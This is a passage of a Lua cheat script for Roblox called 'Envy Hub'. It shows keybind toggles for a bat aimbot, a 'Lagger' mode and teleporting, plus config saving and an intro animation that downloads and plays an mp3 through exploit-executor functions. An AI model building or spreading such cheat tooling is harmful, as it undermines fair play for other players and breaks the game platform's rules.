        task.spawn(doTpDown)
    elseif kbMatch(KB.Lagger,kc) then
        if laggerPhase == 1 then
            laggerPhase = 2; State.laggerToggled = true; State.speedToggled = false
            if mobileLaggerSetActive then mobileLaggerSetActive(true) end
            if modeValLbl then modeValLbl.Text = "Lagger Carry" end
        else
            laggerPhase = 1; State.laggerToggled = true; State.speedToggled = false
            if mobileSpeedSetActive then mobileSpeedSetActive(false) end
            if mobileLaggerSetActive then mobileLaggerSetActive(true) end
            if modeValLbl then modeValLbl.Text = "Lagger" end
        end
    elseif kbMatch(KB.AutoBat,kc) then
        State.autoBatToggled=not State.autoBatToggled
        if State.autoBatToggled then
            if State.autoLeftEnabled then State.autoLeftEnabled=false; stopAutoLeft(); if autoLeftSetVisual then autoLeftSetVisual(false) end end
            if State.autoRightEnabled then State.autoRightEnabled=false; stopAutoRight(); if autoRightSetVisual then autoRightSetVisual(false) end end
            pcall(startBatAimbot)
        else stopBatAimbot() end
        if autoBatSetVisual then autoBatSetVisual(State.autoBatToggled) end
    elseif kbMatch(KB.GuiHide,kc) then
        State.guiVisible=not State.guiVisible
        pcall(function() main.Visible=State.guiVisible end)
        pcall(function() mini.Visible=not State.guiVisible end)
    end
end)

-- ============================================================
-- INIT
-- ============================================================
loadPresetsFile()
loadConfig()

task.spawn(function()
    task.wait(0.3)
    local lastPresetName=loadLastPresetName()
    if lastPresetName and lastPresetName~="" then
        for _,preset in ipairs(Presets) do
            if preset.name==lastPresetName then
                pcall(function() applyPreset(preset.data) end); break
            end
        end
    end
end)

task.delay(1,function() pcall(saveConfig) end)
task.spawn(function() while task.wait(10) do pcall(saveConfig) end end)
-- Save on leave (BindToClose is server-only)
Players.LocalPlayer.AncestryChanged:Connect(function() pcall(saveConfig) end)

print("[Envy Hub] Loaded!")

end)()

-- ============================================================
-- INTRO ANIMATION
-- ============================================================
local function playIntroAnimation()
	if not State or not State.introEnabled then return end
	
	local _introPlayers = game:GetService("Players")
	local _introTween = game:GetService("TweenService")
	local _introPlayer = _introPlayers.LocalPlayer
	local _introGui = _introPlayer:WaitForChild("PlayerGui")

	local SOUL_LOGO_ASSET_ID = "rbxassetid://115490552666225"
	
	local introGui = Instance.new("ScreenGui")
	introGui.Name = "SoulHubIntro"
	introGui.ResetOnSpawn = false
	introGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	introGui.DisplayOrder = 999
	introGui.IgnoreGuiInset = true
	introGui.Parent = _introGui

	local introFrame = Instance.new("Frame")
	introFrame.Size = UDim2.new(1, 0, 1, 0)
	introFrame.Position = UDim2.new(0, 0, 0, 0)
	introFrame.BackgroundColor3 = Color3.fromRGB(5, 8, 18)
	introFrame.BackgroundTransparency = 0.35
	introFrame.BorderSizePixel = 0
	introFrame.Parent = introGui

	local logoImage = Instance.new("ImageLabel")
	logoImage.Name = "SoulLogo"
	logoImage.Size = UDim2.new(0, 280, 0, 280)
	logoImage.Position = UDim2.new(0.5, 0, 0.5, 0)
	logoImage.AnchorPoint = Vector2.new(0.5, 0.5)
	logoImage.BackgroundTransparency = 1
	logoImage.Image = SOUL_LOGO_ASSET_ID
	logoImage.ImageTransparency = 0
	logoImage.ScaleType = Enum.ScaleType.Fit
	logoImage.ZIndex = 0
	logoImage.Parent = introFrame

	local soulLabel = Instance.new("TextLabel")
	soulLabel.Size = UDim2.new(0, 400, 0, 110)
	soulLabel.Position = UDim2.new(0, -350, 0.5, -95)
	soulLabel.AnchorPoint = Vector2.new(0.5, 0.5)
	soulLabel.BackgroundTransparency = 1
	soulLabel.Text = "Envy"
	soulLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
	soulLabel.TextTransparency = 0
	soulLabel.TextSize = 88
	soulLabel.Font = Enum.Font.GothamBold
	soulLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
	soulLabel.TextStrokeTransparency = 1
	soulLabel.ZIndex = 2
	soulLabel.Parent = introFrame

	local hubLabel = Instance.new("TextLabel")
	hubLabel.Size = UDim2.new(0, 400, 0, 110)
	hubLabel.Position = UDim2.new(1, 350, 0.5, 95)
	hubLabel.AnchorPoint = Vector2.new(0.5, 0.5)
	hubLabel.BackgroundTransparency = 1
	hubLabel.Text = "Hub"
	hubLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
	hubLabel.TextTransparency = 0
	hubLabel.TextSize = 88
	hubLabel.Font = Enum.Font.GothamBold
	hubLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
	hubLabel.TextStrokeTransparency = 1
	hubLabel.ZIndex = 2
	hubLabel.Parent = introFrame

	local introCompleteEvent = Instance.new("BindableEvent")
	
	task.spawn(function()
		pcall(function()
			local intros = {
				"https://files.catbox.moe/zuid5n.mp3",
				"https://files.catbox.moe/z6eqnt.mp3",
				"https://files.catbox.moe/t0nlhv.mp3",
				"https://files.catbox.moe/mthg31.mp3",
				"https://files.catbox.moe/ddnbup.mp3",
				"https://files.catbox.moe/hg5cr4.mp3",
				"https://files.catbox.moe/nps6gk.mp3",
				"https://files.catbox.moe/iyw1cb.mp3",
				"https://files.catbox.moe/2w0wtv.mp3",
			}
			local selectedMusic = State.selectedIntroMusic or 1
			local RandomIntro = intros[selectedMusic]
			writefile("EnvyHubIntro", game:HttpGet(RandomIntro))
			local flex1 = Instance.new("Sound", gethui())
			flex1.SoundId = getcustomasset("EnvyHubIntro")
			flex1.PlaybackSpeed = 1
			flex1.Volume = 1
			flex1:Play()
		end)
		
		pcall(function()
			game:GetService("ContentProvider"):PreloadAsync({SOUL_LOGO_ASSET_ID})
		end)
		
		task.wait(0.3)
		
		local camera = workspace.CurrentCamera
		local blur = Instance.new("BlurEffect")
		blur.Size = 56
		blur.Parent = camera

		local flickering = true
		task.spawn(function()
			while flickering do
				logoImage.ImageTransparency = 1
				soulLabel.TextTransparency = 1
				soulLabel.TextStrokeTransparency = 1
				hubLabel.TextTransparency = 1
				hubLabel.TextStrokeTransparency = 1
				task.wait(0.08)
				
				if not flickering then break end
				
				logoImage.ImageTransparency = 0
				soulLabel.TextTransparency = 0.25
				soulLabel.TextStrokeTransparency = 0.3
				hubLabel.TextTransparency = 0.25
				hubLabel.TextStrokeTransparency = 0.3
				task.wait(0.08)
			end
		end)

		local tweenInfo = TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local soulTween = _introTween:Create(soulLabel, tweenInfo, {Position = UDim2.new(0.5, 0, 0.5, -95)})
		soulTween:Play()
		
		task.wait(0.55)
		
		local hubTween = _introTween:Create(hubLabel, tweenInfo, {Position = UDim2.new(0.5, 0, 0.5, 95)})
		hubTween:Play()
		
		soulTween.Completed:Wait()
		task.wait(0.5)

		flickering = false
		task.wait(1.2)

		local fadeInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad)
		_introTween:Create(logoImage, fadeInfo, {ImageTransparency = 1}):Play()
		_introTween:Create(soulLabel, fadeInfo, {TextTransparency = 1, TextStrokeTransparency = 1}):Play()
		_introTween:Create(hubLabel, fadeInfo, {TextTransparency = 1, TextStrokeTransparency = 1}):Play()
		_introTween:Create(introFrame, fadeInfo, {BackgroundTransparency = 1}):Play()
		
		task.wait(0.55)

		pcall(function() blur:Destroy() end)
		introGui:Destroy()
		introCompleteEvent:Fire()
	end)

	introCompleteEvent.Event:Wait()
	introCompleteEvent:Destroy()
end

task.spawn(function()
	task.wait(0.5)
	if State and State.introEnabled then
		playIntroAnimation()
	end
end)

end)()
